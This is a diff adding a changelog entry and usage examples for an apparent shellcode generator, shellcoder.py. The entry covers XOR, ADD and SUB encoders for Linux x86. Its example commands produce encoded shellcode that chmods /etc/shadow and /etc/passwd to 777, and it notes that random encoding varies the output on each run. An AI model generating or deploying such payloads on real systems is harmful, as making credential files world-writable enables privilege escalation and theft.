@@ -1,3 +1,32 @@
+version 1.0.3: AWAKE
+add xor_random encoding chmod() [linux_x86]
+add xor_yourvalue encoding chmod() [linux_x86]
+add add_random encoding chmod() [linux_x86]
+add add_yourvalue encoding chmod() [linux_x86]
+add sub_random encoding chmod() [linux_x86]
+add sub_yourvalue encoding chmod() [linux_x86]
+fixed shellcode encode type checking
+
+Examples: 
+>python shellcoder.py -os linux_x86 -encode xor_random -job chmod('/etc/shadow','777') -o file.txt
+>python shellcoder.py -os linux_x86 -encode xor_random -job chmod('/etc/passwd','444') -o file.txt
+
+Note: each time you execute chmod() function with random encode, you are gonna get random outputs and different shellcode.
+
+>python shellcoder.py -os linux_x86 -encode xor_0x41414141 -job chmod('/etc/shadow','777') -o file.txt
+>python shellcoder.py -os linux_x86 -encode xor_0x45872f4d -job chmod('/etc/passwd','444') -o file.txt
+
+Note: your xor value could be anything. "xor_0x41414141" and "xor_0x45872f4d" are examples.
+
+>python shellcoder.py -os linux_x86 -encode add_random -job chmod('/etc/passwd','444') -o file.txt
+>python shellcoder.py -os linux_x86 -encode add_0x41414141 -job chmod('/etc/passwd','777') -o file.txt
+
+
+>python shellcoder.py -os linux_x86 -encode sub_random -job chmod('/etc/passwd','777') -o file.txt
+>python shellcoder.py -os linux_x86 -encode sub_0x41414141 -job chmod('/etc/passwd','444') -o file.txt
+
+
+
 version 1.0.2: SKIP
 [linux_x86 modules completed]
 add script_executor() [linux - using command execution]
